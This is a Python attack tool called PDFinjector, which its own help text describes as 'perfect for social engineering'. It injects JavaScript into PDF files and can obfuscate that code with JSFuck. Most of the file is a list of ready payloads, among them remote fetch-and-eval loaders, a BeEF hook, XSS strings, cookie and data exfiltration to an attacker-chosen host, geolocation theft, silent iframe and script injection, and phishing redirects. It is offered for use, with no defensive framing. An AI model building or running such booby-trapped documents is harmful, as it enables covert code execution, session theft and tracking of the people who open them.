from pypdf import PdfWriter, PdfReader
import argparse, execjs, re


parser = argparse.ArgumentParser(description="PDFinjector can insert javascript code in pdf files, perfect for social engineering.")

cporcfp = parser.add_mutually_exclusive_group()
parser.add_argument("-f", "--file", type=str, help="the input file", required=True)
parser.add_argument("-o", "--output", type=str, help="the output file, if not set it will overwrite the input file")
cporcfp.add_argument("-cp", "--custompayload", type=str, help="the custom payload to inject, via text")
cporcfp.add_argument("-cfp", "--customfilepayload", type=str, help="the custompayload to inject, via file.js")
parser.add_argument("-ob", "--obfuscate", action="store_true", help="obfuscate the code using jsfuck")

args = parser.parse_args()

banner = r"""     __     _____ ____  _____
|--_ /_-| |    ||    \|  __| _  __ _  _    ___  ___  ___  ___  ___
|  / /  | | |__|| |  ||  __|| || \  || |_ | __|/ __||_ _||   || |_|
|--/----| |__|  |____/|__|  |_||_|\_|| / /|_--|\___| |_| |___||_\_\ V1.0"""
payloads = [
    
    "console.println('JavaScript is running');", "classic log",

    """fetch('https://ARGUMENT/ARGUMENT.js')
    .then(response => response.text())
    .then(script => eval(script))
    .catch(error => console.error('Error loading script:', error));""", "a code in a remote server",
    
    """fetch('https://ARGUMENT/hook.js')
    .then(response => response.text())
    .then(script => eval(script))
    .catch(error => console.error('Error loading script:', error));""", "the BeEF hook",
    
    "<script>alert('XSS!');</script>", "Basic XSS test",

    """<img src='x' onerror='alert("XSS")'>""", "XSS via image onerror",

    """<svg onload=alert('XSS')>""", "XSS via SVG onload",

    """document.write('<script src="https://ARGUMENT/ARGUMENT.js"></script>');""", "Inject external script",

    """<iframe src="https://ARGUMENT" onload=alert('XSS')></iframe>""", "Malicious iframe injection",

    """window.location='https://ARGUMENT/ARGUMENT?cookie='+document.cookie;""", "Cookie theft via redirection",

    """fetch('https://ARGUMENT/ARGUMENT?cookie=' + document.cookie);""", "Cookie exfiltration via fetch",

    """new Image().src='https://ARGUMENT/ARGUMENT?data='+document.cookie;""", "Steal data via image request",

    """document.body.innerHTML += '<iframe src="https://ARGUMENT" width="0" height="0"></iframe>';""", "Silent iframe injection",

    """document.body.innerHTML += '<script src="https://ARGUMENT/ARGUMENT.js"></script>';""", "Silent script injection",

    """eval(atob('YWxlcnQoJ1hTUycp'));""", "XSS via Base64 encoding",

    """var img = new Image(); img.src = 'https://ARGUMENT/ARGUMENT?data=' + btoa(document.cookie);""", "Data exfiltration via Base64",

    """setTimeout("alert('XSS via setTimeout')", 1000);""", "Delayed XSS execution",

    """setInterval("alert('XSS via setInterval')", 5000);""", "Persistent XSS execution",

    """document.body.innerHTML = '<h1>Defaced!</h1>';""", "Simple defacement attack",

    """window.open('https://ARGUMENT', '_blank');""", "Force user to open malicious site",

    """history.replaceState({}, '', 'https://ARGUMENT');""", "Modify browser history for phishing attacks",

    """navigator.geolocation.getCurrentPosition(p => fetch('https://ARGUMENT/ARGUMENT?lat=' + p.coords.latitude + '&lon=' + p.coords.longitude));""", "Steal geolocation data",

    """fetch('file:///ARGUMENT').then(response => response.text()).then(data => console.log(data));""", "Try to access local files (Only works in specific contexts)"
]

def inject(pdft, payload, output):
    print("INJECT...")
    pdft = PdfReader(pdft)
    pdf = PdfWriter(clone_from=pdft)
    pdf.add_js(payload)        
    with open(output, "wb") as pdftrg:
        pdf.write(pdftrg)

def obf(payload):
    f = open("lib/jsfuck.js", 'r')
    f = f.read()
    js = execjs.get()
    cjs = js.compile(f)
    return cjs.call('JSFuck',payload,'1')

def main():
    print(banner)
    payload = ""

    if args.output:
        output = args.output
    else: 
        output = args.file
        
    if args.custompayload:
        payload = args.custompayload
    elif args.customfilepayload:
        try:
            with open(args.customfilepayload, 'r') as f:
                payload = f.read()
        except Exception as e:
            print(f"Error with opening the file: {e}")
    else:
        print("-"*40)
        try:
            for index in range(0, len(payloads), 2):
                print(f"{index//2 + 1}) \nCODE:")
                print(payloads[index])
                print("DESCRIPTION:")
                print(payloads[index + 1])
                print("-" * 40)
        except Exception as e:
            print(f"Error with listing: {e}")
        payload = int(input("select the number of the payload: "))-1
        if 0 <= payload < len(payloads) // 2:
            payload = payloads[payload * 2]
        else:
            print("invalid input")
        c = 1
        for match in re.finditer(r"ARGUMENT", payload):
            try:
                sub = input(f"FOUND ARGUMENT{1}, INSERT SOBSTITUTE: ")
                payload = re.sub(r"ARGUMENT", sub, payload)
            except Exception as e:
                print(f"error during action: {e}")
    if args.obfuscate:
        try:
            payload = obf(payload)
        except Exception as e:
            print(f'error during obfuscation: {e}')

    if args.file:
        print("USING:", payload)
        try:
            inject(args.file, payload, output)
        except Exception as e:
            print(f'error during injection: {e}')
        else:
            print(f"INJECTION SUCCESFULL IN: {output}")
main()
